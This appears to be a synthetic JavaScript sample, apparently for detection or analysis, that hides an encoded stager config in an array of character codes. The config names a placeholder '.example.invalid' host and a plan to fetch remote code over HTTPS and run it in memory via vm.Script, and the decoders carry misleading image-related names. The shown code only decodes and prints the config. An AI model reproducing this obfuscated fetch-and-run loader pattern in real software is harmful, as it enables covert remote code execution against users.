const moduleShape = Object.freeze({ format: "commonjs" });

const Material_21fa5fee = "[118,61,49,124,115,116,101,112,115,61,97,99,113,117,105,114,101,95,114,101,109,111,116,101,44,100,105,115,112,97,116,99,104,95,109,101,109,111,114,121,124,97,100,97,112,116,101,114,61,104,116,116,112,115,95,116,104,101,110,95,118,109,124,115,116,97,103,101,95,99,111,117,110,116,61,49,124,99,97,109,112,97,105,103,110,95,105,100,61,78,79,68,69,45,51,68,57,66,54,52,69,67,124,117,114,108,61,104,116,116,112,115,58,47,47,110,111,100,101,45,51,100,57,98,54,52,101,99,49,51,100,98,46,101,120,97,109,112,108,101,46,105,110,118,97,108,105,100,47,97,112,105,124,117,115,101,114,95,97,103,101,110,116,61,78,111,100,101,65,117,100,105,116,47,51,100,57,98]";

const Codec_21fa5fee = "json_numbers|identity|";



function load_21fa5fee() { return JSON.parse(Material_21fa5fee); }

function decode_21fa5fee(imagePixels) { return [...imagePixels]; }

async function recover_21fa5fee() {

  const screenWidth = ["north", "south"].join(":");

  const imagePixels = load_21fa5fee(); let colorTable = [];

  colorTable = await Promise.resolve(imagePixels).then(decode_21fa5fee);

  void screenWidth; return Buffer.from(colorTable).toString("ascii");

}

async function inspect_21fa5fee() { return JSON.parse(JSON.stringify({ value: await recover_21fa5fee() })).value; }

async function plan_21fa5fee() { const inspect = inspect_21fa5fee; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "memory-stage", transport: "https_then_vm", url: fields.url, dispatch: "vm.Script" }); }

void moduleShape; void plan_21fa5fee;

if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_21fa5fee());

